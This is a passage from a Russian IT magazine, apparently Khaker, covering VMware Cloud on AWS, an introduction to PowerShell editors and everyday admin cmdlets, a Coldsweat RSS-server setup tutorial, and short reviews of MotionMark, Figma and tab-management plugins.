ные ему технологии VMware, а с другой — расширять по необходимости ем-
кость своего ЦОДа за счет публичного облака Amazon. Преимущество в том,
что можно использовать те же инструменты и понятия, к которым привыкли ад-
министраторы, без необходимости переучиваться и погружаться в идеологию
«Амазона». Помимо прочего, это позволяет обеспечить необходимый уровень
SLA и совместимость приложений заказчика как с частной, так и с публичной
инфраструктурой.
   Если спуститься на уровень ниже, то для такого совместного проекта в рам-
ках инфраструктуры Amazon используется выделенное оборудование, которое
помогает запускать оптимизированные продукты виртуализации VMware по-
верх технологий Amazon: VMware vSphere и Amazon EC2 (вычислительные ре-
сурсы), VMware NSX и Amazon VPC (сетевые ресурсы), VMware vSAN и Amazon
EBS (ресурсы для хранения). Со стороны технологий VMware все управляет-
ся через единое окно — vCenter, со стороны Amazon можно использовать все
возможности AWS. Эти технологии дают лучшее из двух миров частных и пу-
бличных облаков: возможность переноса приложений, готовую инфраструкту-
ру безопасности, необходимую производительность, эластичность сервисов,
возможности использования DR, микросегментацию, запуск контейнеров,
эффективное управление стоимостью ресурсов и многое другое — и все это
по модели «как сервис». Причем все сервисы предоставляются, управляются,
поддерживаются и продаются через единого поставщика — VMware.
   Хочу отметить, что пока что все эти технологии находятся в статусе Technical
Preview, а полномасштабный запуск планируется на 2017 год.

Новое в vSphere 6.5

В октябре на конференции VMworld 2016 компания VMware объявила о гряду-
щем обновлении платформы виртуализации vSphere до версии 6.5. Заявле-
но, что в нем появятся новые средства автоматизации и менеджмента. Вот не-
сколько ключевых новинок в vSphere 6.5:
•  vCenter — средство, которое упрощает доставку патчей, апгрейд, бэкапы
   и восстановление, станет ключевым элементом vSphere;
•  vSphere Client — новое клиентское средство администрирования основано
   на HTML5 и упрощает администрирование;
• VM Encryption — средство шифрования уровня виртуальных машин, призва-
   но защитить от неавторизованного доступа к данным и виртуальным маши-
   нам, проходящим миграцию при помощи vMotion;
•  Secure Boot — нововведение, которое обеспечит защиту от вмешательства
   в образы и от загрузки неавторизованных компонентов;
•  интегрированные контейнеры (Integrated Containers) — интерфейс, совме-
   стимый с Docker, который позволит клиентам загружать контейнеры, не на-
   рушая инфраструктуру.

Отдельно стоит отметить появление RESTful API, которые упрощают автома-
тизацию и облегчают жизнь программистам и администраторам. Ну и конеч-
но, новая версия претерпела ряд оптимизаций, которые должны заметно уве-
личить производительность. Финальный релиз vSphere 6.5 увидит свет летом
2017 года.


КАК ПРОИСХОДИТ МИГРАЦИЯ МЕЖДУ ЧАСТНЫМ
И ПУБЛИЧНЫМ ОБЛАКОМ

1. Выбираем место расположения





При использовании данной технологии имеется возможность выбрать один
из регионов для размещения ресурсов заказчика, в частности один из реги-
онов, доступных в AWS. Для размещения ресурсов используется выделенная
аппаратная инфраструктура Amazon нового поколения, на которой обеспечи-
вается работа настоящего гипервизора VMware ESX.

2. Выбираем размер





Для аренды публичных вычислительных ресурсов Amazon можно выбрать не-
сколько вариантов: от нескольких хостов до мощного кластера в 64 ноды. Все
зависит от потребностей заказчика. Аренда ресурсов в Amazon происходит
из единого аккаунта VMware через стандартный личный кабинет, откуда можно
управлять всеми лицензиями VMware. Если необходимо, возможно использо-
вать REST API для выделения ресурсов, расширения публичного ЦОДа, бил-
линга и прочего.

3. Оплата





Здесь все просто: выбор модели резервирования и учета ресурсов: почасо-
вая оплата (Pay-As-You-Go) или резерв ресурсов на один или три года. Опла-
тить можно кредиткой или с баланса личного кабинета VMware.

4. Окружение VMware SDDC





Панель мониторинга и управления публичными ресурсами: ресурсы в публич-
ном облаке Amazon арендуются в нескольких регионах, отображается их за-
грузка.

5. vCenter, full environment





Замечательная вещь — возможность иметь единое средство управления пря-
мо из консоли vCenter. Не надо переключаться между разными интерфейсами,
использовать разные консоли и так далее. У администратора всего одно окно
для управления как внутренними ресурсами, так и публичными Amazon, вклю-
чая управление разными регионами.

6. Пример миграции:
  перемещаем сервис из одного облака в другое





Возможность миграции виртуальной машины существует уже очень давно.
Сейчас же мы выходим на новый уровень — можно перемещать ВМ как из ло-
кального ЦОДа в публичный (из внутреннего облака VMware в облако Amazon),
так и между различными регионами публичного облака Amazon. На скриншо-
тах ВМ с названием ETL Service мигрирует из Денвера в Орегон.

7. Что будет, если превысить объем кластера?





Администратор организации имеет возможность активировать автоматиче-
ское масштабирование вычислительных ресурсов. То есть в случае нехватки
публичных ресурсов в автоматическом режиме будут запрошены и выделены
новые. С одной стороны, технология построена поверх AWS EC2 API, которая
и обеспечивает возможность выделения новых ресурсов, а с другой — ис-
пользуется ресурсная модель и анализ использования ресурсов от VMware.
Причем наряду с простым перераспределением ресурсов реализованы и тех-
нологии обхода отказов, когда в случае падения аппаратного сервера для за-
казчика тут же выделяется новый совершенно бесплатно. Эта технология была
бы невозможна без совместного использования всех накопленных ноу-хау
VMware и Amazon.
PCZONE
СИЛА
РАКУШКИ





    Алексей «Zemond»
       Панкратов
     3em0nd@gmail.com

ВЫБИРАЕМ СРЕДСТВО РАЗРАБОТКИ
И ПИШЕМ СКРИПТЫ НА POWERSHELL



В администрировании всегда есть место творчеству. Хо-
чешь сделать какую-нибудь автоматизацию рутинной за-
дачи? Пожалуйста! Нужно что-то регулярно проверять
на активность? Не вопрос! Хочешь обработать какой-ни-
будь гигантский отчет и вывести только актуальные дан-
ные? Тоже можно. Все эти и многие другие задачи лучше
всего решать при помощи скриптов, и язык PowerShell
в случае с Windows — оптимальный выбор.

ЧТО ТАКОЕ POWERSHELL И ЧЕМ ОН ХОРОШ
Пользователи UNIX и Linux, а с какого-то момента и macOS привыкли к тому,
что под рукой всегда есть Bash — немного старомодное, но универсальное
и мощное средство, при помощи которого всего парой строк можно творить
удивительные вещи. Прописываешь новый скрипт в cron — и готово, он уже
крутится на твоем компьютере или на сервере и незаметно делает что-нибудь
полезное.
   Возвращаясь в Windows (а без этого иногда никак), понимаешь, что скрип-
ты .bat хоть и хороши, но спасают не всегда: очень уж ограниченны их возмож-
ности. И если ты до сих пор считал, что PowerShell — это неведомая штуко-
вина, ради которой нужно что-то там поднимать и настраивать, то не спеши
с выводами — он, если разобраться, совсем неплох.
   Windows PowerShell — это расширяемое средство автоматизации с от-
крытыми исходниками, которое состоит из оболочки (командной строки)
и скриптового языка. Впервые он был показан в 2003 году (тогда он называл-
ся Monad). PowerShell 2.0 вышел в составе Windows 7 и Windows Server 2008
R2 и с тех пор присутствует в Windows в качестве стандартного компонента.
Его даже включили в Windows XP SP3. PowerShell построен на основе .NET
Framework и интегрирован с ним. PowerShell может обращаться к COM, WMI
и ADSI, а также, конечно же, исполняет консольные команды.
  В общем, «пошик» имеет крепкие связи с продуктами Microsoft, будь
то Active Directory или почтовый сервер Exchange. Это позволяет без подключе-
ния к оснастке сервера обращаться к ним через консоль и отдавать команды.
   Если раньше ты не интересовался PowerShell, то, скорее всего, у тебя стоит
вторая версия. Я рекомендую обновиться как минимум до третьей — она со-
держит куда больше возможностей и полезных фишек. Если не вдаваться
в подробности, то в PowerShell 2.0 входит около десятка модулей и примерно
350 команд, а в PowerShell 3.0 уже около 2300 командлетов из более чем 70
модулей. «Хакер» также писал о том, чем отличается самый новый PowerShell
пятой версии из Windows 10.

ВЫБИРАЕМ СРЕДУ РАЗРАБОТКИ И ИНСТРУМЕНТЫ
Теперь давай разберемся, где удобнее всего писать код. Можно, конечно,
и в «Блокноте», Notepad++ или Sublime. Но это в данном случае не самый гра-
мотный выбор редактора. Лучше всего начинать знакомство с PowerShell, воо-
ружившись идущим в комплекте PowerShell ISE.





                                                                     PowerShell ISE

Это даже не редактор, а практически полноценная среда разработки. Здесь
есть функция IntelliSense, которая позволяет просматривать перечень ко-
мандлетов и их параметров, переменных, утилит и прочего. Поддерживаются
сниппеты, есть возможность расширения набора функций за счет различных
аддонов. Очень полезно и окно Commands. В нем можно составлять коман-
ды в визуальном режиме: выбираешь модуль, находишь нужный командлет
и задаешь ему необходимые параметры. Получившуюся команду можно ско-
пировать в консоль или сразу запустить на выполнение. В общем, этакий
конструктор для админа. Ну и конечно, есть подсветка синтаксиса, дебаггер
и многое другое.
  Тем не менее у PowerShell ISE есть и достойные конкуренты. Один из них —
Dell PowerGUI.
   PowerGUI — это визуальное дополнение к PowerShell. Оно упрощает сбор-
ку собственных сценариев до выбора необходимых командлетов. Берешь то,
что нужно для решения задачи, и перетаскиваешь части кода, пока не полу-
чишь скрипт. Одна из главных фишек PowerGUI — это Power Packs, готовые
скрипты, опубликованные сообществом пользователей и выложенные в сво-
бодный доступ. Тут есть и простенькие команды вроде добавления пользова-
телей, и сложные — к примеру, управление свитчами и виртуальными машина-
ми. Все их легко дополнять и модифицировать в соответствии с нуждами.





                                                                   PowerGUI

PowerShell Studio 2015 фирмы Sapien — более продвинутая среда, которая
рассчитана на совместную разработку одного проекта большим количеством
участников. Если ты когда-нибудь имел дело с Visual Studio, то, думаю, заме-
тишь сходство. Среди полезных фишек PowerShell Studio — панель Ribbon,
поддержка удаленной отладки, а также функции компилятора, которые позво-
ляют включить скрипты в исполняемые файлы. Есть поддержка разных версий
PowerShell.





                                                              PowerShell Studio 2015

Стоит упомянуть и Script Browser для Windows PowerShell ISE. Это не среда раз-
работки, но весьма интересный инструмент, разработанный в Microsoft. Script
Browser открывает доступ к базе готовых скриптов, которые можно использо-
вать в качестве образцов для написания своего кода. А еще эта штука умеет
анализировать код, который ты пишешь, и подсказывает, как его улучшить.





                                                      Script Browser для Windows PowerShell


НЕСКОЛЬКО ПОЛЕЗНЫХ ТРЮКОВ
Разобравшись с редактором, можно приступать к напи-
санию кода. PowerShell — несложный язык, и, я думаю,
ты быстро разберешься, что к чему. Команды здесь на-
зываются командлетами, и каждый из них состоит из двух                                                         INFO
частей. Сначала идет действие, например Get, Set, Add,
Invoke, Remove. Затем указывается то, на что действие на-      Если при наборе
правлено: Service, VM, AzureAccount, DHCPServerSetting.    команды нажать Tab,
                                                                                 то редактор дополнитКаждая часть отделяется от другой дефисом. Получается,                                                                          команду — так же,
к примеру, get-process. Это, кстати, полезная команда, ко-        как в консоли.
торая выводит список процессов. Скажем, если написать       Двойное нажатие
                                                                             на Tab выведет
                                                                            список подходящих
get-process BadTh*                                                         команд.

увидим что-то такое:

Handles  NPM(K)  PM(K)    WS(K)    VM(M)  CPU(s)  Id    ProcessName
28       4       -210844  -201128  -163   25.67   2792  BadThread

Теперь можно завершить зависший процесс:

stop-process -id 2792

Хочешь посмотреть права на директорию? Сделать это помогает такой ко-
мандлет:

E:>Get-Acl N:Data

Можно просмотреть рекурсивно, правда уже чуть с более сложной логикой:

E:>Get-ChildItem N:Data -recurse | Get-Acl

Если не можешь понять, что делает какой-то командлет, напиши следующее
(заменив Get-Process на название неизвестного командлета):

Get-Help -Name Get-Process

Можно также выполнить

Get-Help -Name Get-*

В этом случае будет выведен весь список возможных вариантов.
Теперь давай попробуем узнать что-нибудь о нашем домене через консоль
PowerShell. К примеру, давай посмотрим пользовательские аккаунты, у кото-
рых установлен неистекающий пароль:

Search-ADAccount -PasswordNeverExpires | FT Name,  ObjectClass,
    UserPrincipalName

Кстати, к каждому полю в окошке опции учетной записи или компьютера мож-
но обратиться и считать данные. Таким образом можно делать целые срезы.
Вот, к примеру, запрос на основе данных о телефонных номерах:

Get-AdUser -Filter * -Properties OfficePhone | FT OfficePhone,
    UserPrincipalName


POWERSHELL В СРАВНЕНИИ С BAT
Иногда задачу можно решить как старым дедовским методом, так и при помо-
щи PowerShell. Я рекомендую не лениться и использовать PS, хотя бы просто
потому, что так ты его быстрее изучишь и сможешь применять в более слож-
ных ситуациях. К тому же ты постепенно оценишь его синтаксис — более эле-
гантный и консистентный. Вот несколько примеров, как вещи делались рань-
ше и как их можно сделать при помощи PowerShell.
  Следующая командная строка перезагрузит компьютер с задержкой в де-
сять секунд:

shutdown /r /m \\SERVER1 /f /t 10

На PowerShell это будет выглядеть вот так:

Start-Sleep 10
Restart-Computer -Force -ComputerName SERVER1

Вот так через bat можно перезагрузить службу dnscache (или любую другую):

sc stop dnscache
sc start dnscache

В PowerShell это будет так:

Restart-Service dnscache

Мап диска в bat:

Net use L: \\server1\c$

И в PowerShell:

New-PSDrive -name L -psprovider FileSystem -root \\server1\c$

Да, иногда приходится печатать чуть больше букв, но читаются команды PS го-
раздо лучше. И это не говоря уже про разные новые возможности.

УДАЛЕННОЕ УПРАВЛЕНИЕ С POWERSHELL
В основном описанные в статье команды выполняются на том же компьютере,
на котором они запущены. Проще говоря, команды для управления AD выпол-
нять нужно на сервере, где контроллер домена и установлен, что, согласись,
на корню рубит удобство и автоматизацию. Для выполнения команд удаленно,
что нам и требуется, надо пользоваться специальными командлетами. К при-
меру, для подключения к удаленному компьютеру и перезапуску там спулера
печати вводи

Enter-PSSession -ComputerName SRV4
Restart-Service -Name spooler

Более подробно читай тут.

ЧТО ПОЧИТАТЬ ЕЩЕ
Книжек и прочих обучающих материалов по PowerShell огромное количе-
ство. Есть как справочники, так и учебные туториалы. Начать можно с сайта
Microsoft, где есть неплохие видеоуроки.
  В деле немало поможет и книга «Master-PowerShell» Тобиаса Велтнера.
В ней автор охватывает многие понятия вроде массивов, хеш-таблиц, конвей-
еров, объектов, функций, обработки ошибок, регулярных выражений и так да-
лее. Заодно подробно рассматривается XML и разные аспекты администри-
рования. Увы, на русский эта книга не переведена.
  Из русскоязычных мануалов по  PowerShell мне попадался «Windows
PowerShell 2.0. Справочник администратора» Уильяма Станека — он весьма
неплох.
  На «Хабрахабре» есть перевод полезной статьи Джеффери Хикса об адми-
нистрировании Active Directory при помощи PowerShell.

ИТОГО
Как видишь, все не так сложно, как кажется на первый взгляд. Главное — чет-
ко понимать, что нужно на выходе, и на этом основании выбирать командлеты.
А с удобным редактором это делать куда легче. Доступность разнообразных
заготовок может заметно упростить решение повседневных задач адми-
нистрирования. Знания «пошика» прокачаешь по ходу дела, а это в работе
с Windows совсем не лишнее.
PCZONE


                  СТАВИМ
                 И ДОРАБАТЫВАЕМ
                  COLDSWEAT — СЕРВЕР
                  СИНХРОНИЗАЦИИ RSS
                  ДЛЯ СВОЕГО ХОСТИНГАRSS
В ХОЛОДНОМ
ПОТУ





Если ты устал видеть в своих фидах лишние
посты или хочешь получать вместо заголов-
ков полноценные тексты, то отправляйся
                                                                        Андрей Письменныйсо мной — в путешествие, которое сделает
тебя повелителем RSS и владельцем соб-
ственного сервиса синхронизации.

Начну с чистосердечного признания: я — фанат RSS. Я прекрасно знаю,
что этот формат уже не в моде и что для многих социальные сети полностью
заменили старые добрые новостные агрегаторы. Но таких, как я, пока что до-
статочно для того, чтобы существовали прекрасные средства для работы с фи-
дами. Об одном из них я и хочу рассказать. Пусть тебя не смутит хардкорность
его установки и настройки: возможности, которые ты получишь в итоге, окупят
всю мороку.

ЗАДУМКА
Мысли о том, что хорошо бы как-нибудь настроить фильтрацию RSS, я вына-
шивал давно — практически все время, что я пользуюсь агрегаторами (то
есть примерно со времен появления Google Reader и яндексовской «Лен-
ты»; ныне оба уже не работают). Возможность зафильтровать элементы фида
по ключевым словам мне попалась в маковском клиенте ReadKit (подробно-
сти — в моем обзоре за 2014 год), но я предпочитаю Reeder, к тому же филь-
тры должны работать на серверной стороне, иначе клиенты для телефона
и планшета останутся в пролете.
  Временным решением стал переход с Feedly, который я использовал в ка-
честве бесплатного бэкенда, на Inoreader — замечательный сервис, разрабо-
танный крайне мотивированной и душевной польской командой (о нем я, кста-
ти, тоже уже писал). В платной версии Inoreader есть поддержка фильтров (до
30 штук) и другие приятные фичи.





                                                  Создание фильтра в Inoreader

Однако тариф с фильтрами обходится в 30 долларов за год, что сравнимо
с ценой недорогого хостинга. А это уже наводит на вполне конкретные мысли:
нельзя ли сделать собственный аналог и вместо встроенных фильтров, логика
которых ограничена, писать любые скрипты?
  Проще всего, наверное, было бы написать пару скриптов, которые бы
по расписанию забирали, обрабатывали и выкладывали нуждающиеся в филь-
трации фиды на какой-нибудь хостинг, а тот же Feedly их бы оттуда подхваты-
вал. Однако, наткнувшись на проект Coldsweat, я не мог устоять.
   Coldsweat — это опенсорсный клон Fever, платного средства синхрониза-
ции RSS, которое предназначено для установки на свой сервер. Собственно,
существование протокола Fever и делает Coldsweat удобным: поддержка Fever
API есть в некоторых продвинутых агрегаторах, в том числе в Reeder. Coldsweat
написан на Python, использует базу данных SQLite (по желанию можно настро-
ить PostgreSQL или MySQL), имеет систему плагинов и веб-интерфейс. То,
что нужно!





                                                      Веб-интерфейс Coldsweat

ПРИГОТОВЛЕНИЯ
Вот список того, что понадобится для развертывания Coldsweat.
•  Дистрибутив Coldsweat. Скачай или клонируй его с GitHub.
•  Сервер с UNIX или Linux и как минимум доступом к cron и .htaccess (лучше,
   конечно, полный шелл).
•  Python 2.7, желательно не младше 2.7.9. С Python 3.x Coldsweat не заведется.
•  Библиотеки Peewee, Requests, WebOb и Tempita. Все они перечислены
   в файле requirements.txt, так что можешь просто написать pip install -r
   requirements.txt (в системе для этого должны быть команды pip и easy_
   install из пакета python-setuptools).
•  Библиотека Flup — на сервере она понадобится в том случае, если ты бу-
  дешь использовать FastCGI (а это рекомендуется); для локального тестиро-
   вания она не нужна.

УСТАНОВКА
Скачав Coldsweat и установив зависимости, ставим его, как написано в ин-
струкции. Для начала копируем конфиг из файла с примером:

$ cp etc/config-sample etc/config

Забегая вперед, скажу, что у меня Coldsweat со стандартным конфигом не за-
работал, причем Python падал без объяснения причин. Проблемой, как ока-
залось, была многопоточность, так что рекомендую для начала выключить ее.
Для этого открой etc/config, найди строку ;processes: 4, убери точку с запя-
той и поменяй 4 на 0. Заодно можешь глянуть на остальные настройки.
   Возвращаемся в корень проекта и выполняем команду

$ python sweat.py setup

Скрипт попросит данные для учетки, после чего создаст базу данных. Если тво-
им сервером будет пользоваться кто-то еще, посмотри в инструкции, как ре-
гистрировать дополнительных пользователей.
   Теперь импортируем файл OPML со списком фидов. Для тестирования ав-
тор Coldsweat рекомендует взять subscriptions.xml из каталога coldsweat/
tests/markup/, но лучше лишний раз не мусорить в базе и сразу добавлять
актуальный список.

$ python sweat.py import путь/к/файлу.xml

Проверяем, забираются ли фиды:

$ python sweat.py fetch

Если  все  настроено  правильно,
то  через  какое-то  время  скрипт
завершится  со  словами  «Fetch
completed. See  log   file  for more
information». Если запустить sweat.
py с параметром serve, то на пор-
ту 8080 у тебя заработает тестовый
веб-сервер. Можешь сразу подклю-
чить к нему агрегатор, чтобы было
удобнее тестировать.

Есть одна проблема

Перейдя с того же Feedly на свой сервер, мы лишились возможности добав-
лять фиды через агрегатор и перекладывать их из папки в папку перетаскива-
нием. Reeder, к примеру, поддерживает такие функции для Feedly и Inoreader,
но не для Fever. Наводить порядок теперь придется через веб-интерфейс
Coldsweat, а добавлять фиды можно будет букмарклетом (когда поставишь
Coldsweat на свой сервер, нажми на кнопку + в левой панели веб-интерфейса
и перетащи букмарклет оттуда на панель браузера).



ПИШЕМ ПРОСТОЙ ПЛАГИН
Синхронизация и скачивание фидов работает, а значит, мы уже можем сделать
всякие интересные штуки. Coldsweat поддерживает плагины, так что попробу-
ем воспользоваться ими в своих целях. Вот пример совсем простого плаги-
на, который следит за поступлением комиксов Cyanide & Happiness, заходит
на страницы по ссылкам и перекладывает комиксы оттуда в сам фид (подразу-
мевается, что необходимый RSS уже добавлен в список).





Здесь используется декоратор @event, чтобы функция entry_parsed вызыва-
лась каждый раз, когда заканчивается парсинг записи. Еще существуют собы-
тия fetch_started и fetch_done — они срабатывают, соответственно, когда
начинается или заканчивается процесс агрегации фидов. Если при написа-
нии плагинов тебе понадобится знать структуру объектов типа Entry или Feed,
то можешь подсмотреть их в файле models.py.
   Чтобы плагин заработал, сохрани его в папку plugins, к примеру, под име-
нем cyanide.py, а затем найди в etc/config секцию [plugins] и впиши туда
строчку load: cyanide. Все последующие плагины будут перечисляться даль-
ше через запятую.

ДОБАВЛЯЕМ READABILITY
Следующий полезный трюк, который можно провернуть на своем сервере
и нельзя было сделать при помощи Inoreader, — это подкачка полнотекстовых
записей. Конечно, в том же Reeder ты всегда можешь нажать кнопку Readability
и получить текст поста, но включать такую функцию по умолчанию автор агре-
гатора не стал по этическим причинам. Мы же в частном порядке вполне мо-
жем позволить себе это маленькое удобство.
   К сожалению, сервис Readability вот-вот закроется и возможность полу-
чать новые ключи к API уже убрали. Разработчики рекомендуют переходить
на Mercury — аналог, который разрабатывает другая команда. Что ж, послуша-
ем их совета.
   Чтобы использовать Mercury, понадобится зайти на сайт сервиса и зареги-
стрироваться. После регистрации тебе выдадут ключ, при помощи которого
ты сможешь обращаться к API из своих скриптов. Услуга пока что бесплатная,
без видимых ограничений.
   Создадим теперь конфигурационный файл со списком фидов, содержи-
мое записей в которых мы будем получать через Mercury. Я, к примеру, создал
файл mercury-feeds.json и положил его в папку etc внутри проекта.

[
  {"title": "The Verge", "image": "yes"},
  {"title": "AppleInsider", "image": "no"},
  {"title": "Kotaku", "image": "no"}
]

В поле title вносится подстрока, которая должна присутствовать в названии
фида, поле image нужно, чтобы скрипт определял, вставлять или не вставлять
в начало поста титульную картинку (к примеру, в фидах Kotaku и AppleInsider
она уже включена, а на Verge — нет).
  А вот, собственно, сам плагин.





Не забудь вставить свой ключ в словарь headers в начале, сохрани файл
(к примеру, под именем mercury.py), кинь в plugins и пропиши в etc/config. Те-
перь можно наслаждаться полнотекстовыми фидами!

ДЕЛАЕМ СИСТЕМУ ФИЛЬТРОВ
Мы добрались до того, ради чего я затевал все это дело, — фильтрации фидов
по ключевым словам. К сожалению, при помощи системы плагинов сделать
полноценные фильтры мне с наскока не удалось, и пришлось грубо хакнуть
сам Coldsweat.
  Проблема в том, что ивент entry_parsed вызывается после того, как за-
пись получена, но до того, как она сохраняется в базе. Соответственно, сте-
реть ее из базы плагин не может. Наверное, правильнее было бы обраба-
тывать событие fetch_done и проходиться по базе в поисках неугодных нам
записей, но я выбрал самый короткий путь и добавил кастомную проверку.
   Открываем файл fetcher.py и ищем строки



Оборачиваем их в условие if(check.check_entry(entry)): (не забудь от-
ступы, а то Python тебе этого не простит) и добавляем в начало файла строку
import  check. Остается в той же папке создать файл check.py с описанием
функции check_entry. Вот его содержимое.





Здесь есть проверки полей title и author, остальные (к примеру, 'link') мо-
жешь дописать сам по аналогии, если понадобится. А вот выдержка из моего
файла etc/rules.json:

[
  {
    "feed": "asymco", "filter": "this", "title":
      ["Asymcar",
      "Critical Path",
       "Significant Digits",
      "Sponsor:"]
  },
  {
  "feed": "Charlie's Diary", "filter": "this", "title":
    ["guest blogger"]
  },
  {
  "feed": "Charlie's Diary", "filter": "other", "author":
    "Charlie Stross"
  },
  {
  "feed": "O'Reilly Radar", "filter": "other", "title":
    ["Four short links"]
  }
]

В поле feed содержится подстрока, которая должна быть в названии филь-
труемого фида (регистр учитывается), filter — режим фильтрации (слово
this будет означать фильтрацию записи с перечисленными далее словами,
other — записей, которые, наоборот, таких слов не содержат). Поле author
используется, чтобы проверять имя автора.
   Например, в блоге писателя Чарли Стросса я хочу видеть только его соб-
ственные записи, а не приглашенных авторов, заодно скрываются и посты,
где он этих авторов представляет (они имеют пометку guest blogger). В блоге
Asymco меня не интересуют спонсорские посты и анонсы подкастов, из кото-
рых фид состоит более чем наполовину. А в блоге O’Reilly Radar я читаю только
рубрику Four short links. Думаю, идея ясна.

СТАВИМ COLDSWEAT НА СВОЙ СЕРВЕР
Если на локальной машине все работает как положено, то можно перехо-
дить к следующему этапу — установке Coldsweat на свой сервер. Там для это-
го уже должен стоять Apache или nginx. Скажу сразу, подружить Coldsweat
с nginx у меня не вышло — я поправил конфиги, как описано в руководстве,
но по причинам, так и оставшимся неизвестными, из этого ничего не получи-
лось. Возможно, помогло бы поставить прослойку в виде uWSGI или Gunicorn,
но настраивать еще и один из них желания не было. Так что я выбрал Apache
и FastCGI, и все с легкостью завелось.
   Если ты уже залил Coldsweat на сервер, то осталась всего пара шагов.
Первый — настройка Apache. Пример его конфига ты можешь найти в справ-
ке к Coldsweat (обрати внимание, для FastCGI он слегка другой). Сохрани его
в файл и положи в /etc/apache2/sites-enabled. Заодно замени пути к папке
static и к файлу dispatch.fcgi и не забудь дать ему права на исполнение. Еще
понадобится создать пользователя www-data, если его нет, и дать ему права
на каталог с Coldsweat.
   Теперь можешь зайти через браузер, и если все настроил правильно,
то увидишь веб-интерфейс Coldsweat. Чтобы читать фиды через агрегатор,
добавь себе аккаунт Fever, а в поле адреса укажи URL своего сервера с при-
пиской /dispatch.fcgi/fever/.
   Теперь нам нужно сделать так, чтобы база обновлялась через определен-
ные интервалы времени. Это легко — достаточно прописать скрипт sweat.py
fetch в crontab. Поскольку Coldsweat работает с локальными путями, можешь
добавить его каталог в PATH или сделать вот такую обертку:

#!/usr/bin/env bash
cd путь-к-coldsweat/
python sweat.py fetch

Назови ее, к примеру, cs.sh, дай права на исполнение и добавляй в crontab
строку

*/10 * * * * /путь/cs.sh

Это задаст интервал проверки раз в десять минут.

ЧТО ДАЛЬШЕ
Мы прошлись по самым простым доработкам к Coldsweat и создали систему
фильтрации, которую ты можешь пополнять и совершенствовать в соответ-
ствии с возникающими потребностями. Это уже само по себе неплохое под-
спорье для любителя RSS. А еще ты теперь знаешь, как дописать к Coldsweat
все, что тебе вздумается: можешь как угодно модифицировать записи, запра-
шивать дополнительные страницы, создавать свои фиды или, например, под-
ключить нейросеть, которая будет генерировать фид на основе личных пред-
почтений. Возможности, как говорится, безграничны.
PC ZONE





                          Андрей Письменный                         Алексей
                                apismenny@gmail.com                          Панкратов


       MOTIONMARK — БРАУЗЕРНЫЙ БЕНЧМАРК
       ДЛЯ ТЕСТИРОВАНИЯ ГРАФИКИ
          browserbench.org/MotionMark
1





                            Существует масса разных средств для проверки скорости рабо-
         ты браузера. Среди самых известных — гугловский Octane, мозил-
         ловский Kraken и JetStream, созданный авторами WebKit и пришед-
        ший на смену SunSpider. MotionMark разработан той же командой
          в Apple, а целью на этот раз было тестирование производительно-
          сти графического движка.
           Обычно синтетические тесты графики проверяют производи-
          тельность при помощи функции setTimeout() и вычисляют количе-
          ство кадров в секунду. Этот подход не устраивал разработчиков
          WebKit. Дело в том, что современные браузеры стараются оптими-
          зировать потребление ресурсов и не выводят больше кадров в се-
           кунду, чем человек способен различить.
           Второй причиной для создания нового  теста было жела-
         ние разработать универсальный метод сравнения производи-
          тельности, который бы одинаково хорошо работал на всех плат-
        формах — то есть и на десктопе, и на мобильных устройствах.
         Для этого MotionMark подгоняет размер сцены под актуальный
         размер экрана, вернее автоматически выбирает из трех разреше-
          ний: одно для телефонов, другое для ноутбуков и планшетов, тре-
          тье для десктопов.





                                                                             Результат работы MotionMark

         К тому же в существующих тестах проверяется все подряд, а соз-
          датели MotionMark хотели выделить именно скорость отрисовки
          графических примитивов и работу новых функций движка, которые
         появились с реализацией новейших стандартов HTML5. В офици-
         альном блоге проекта WebKit разработчики сообщают, что благо-
         даря новому тесту удалось выявить проблемные участки кода и зна-
          чительно повысить производительность в Safari последних версий.
           Для проверки скорости работы браузера с популярными фрей-
         мворками JavaScript есть тест Speedometer, а для замеров скоро-
          сти работы продвинутых функций браузера (в том числе на основе
         работы разных криптографических алгоритмов) — уже упомянутый
           JetStream.


       FIGMA — МНОГОПОЛЬЗОВАТЕЛЬСКИЙ ВЕКТОРНЫЙ
       РЕДАКТОР, КОТОРЫЙ РАБОТАЕТ В БРАУЗЕРЕ
          figma.com
2





                            Мы уже неоднократно писали о браузерных векторных редакто-
           рах: в частности, нам приглянулись Gravit и Draw.io (второй больше
         ориентирован на диаграммы и мокапы, чем на рисунки). Редактор
         Figma — достойный конкурент им обоим, и у него есть важная от-
          личительная черта — поддержка одновременного редактирования
          сразу несколькими пользователями.
          В конце сентября 2016 года разработчики Figma объявили о на-
          чале открытого бета-тестирования, то есть для регистрации теперь
         не нужно приглашение. Заходим на сайт, вбиваем почту и пароль
         и можем начинать работать.
            Рекомендуется использовать Chrome или Firefox, но если ты за-
        йдешь в главное меню (три полоски в левом верхнем углу), то уви-
        дишь там пункт Get Desktop App — он выдаст тебе дистрибутив
         для Windows или macOS, где браузер уже встроен. Дополнительно
        можно скачать на iPhone или iPad приложение Figma Mirror, кото-
         рое поможет UI-дизайнерам сразу просматривать мокапы интер-
         фейса на экране мобильного устройства.





                                               К Figma прилагаются шаблоны для Material Design

       В Figma есть все основные векторные инструменты (примитивы,
          кривые, выравнивание, сортировка объектов), поддерживаются
         эффекты для слоев и фигур (в том числе режимы прозрачности,
           как в Photoshop), есть достойные настройки обводок и шрифтов
         (нашлась даже пара шрифтов с кириллицей), а также удобства вро-
         де линеек и сетки. Булевых операций для объектов пока что нет, их
          частично заменяет возможность превращать фигуры в маски и по-
         мещать внутрь них другие объекты.
           Особо хочется отметить тонкую проработку векторных инстру-
          ментов. Есть автоматические подсказки для выравнивания и замы-
          кания, кнопка Alt помогает создавать копии фигур или отдельных
          точек (со всеми связями), добавление и удаление точек и превра-
        щение прямых в кривые Безье не вызывает вопросов и не стано-
          вится квестом. Визуальное редактирование градиентных заливок
         реализовано вообще шикарно.
           Ну и конечно, главное достоинство Figma, которое делает этот
         редактор уникальным, — это совместная работа над документа-
          ми. Приглашаешь другого пользователя, и его курсор появляется
         на экране, а все, что он делает, будет моментально отображаться
           у всех остальных. Кажется, именно так когда-нибудь будет рабо-
           тать каждая приличная программа.


        TOBY, TREE STYLE TAB И ONETAB — ПЛАГИНЫ,
      КОТОРЫЕ УПРОЩАЮТ РАБОТУ С ВКЛАДКАМИ
                            Самый простой способ борьбы с миллионом открытых в браузе-
         ре вкладок — сохранять страницы в закладки или складировать их
          в Pocket или Evernote, а потом закрывать лишние табы. Однако с по-3        мощью плагинов можно разгребать завалы намного удобнее.
            Плагин для Chrome под названием Toby превращает новые пу-
         стые вкладки в место хранения списка табов.





                                                                                          Toby — общий вид

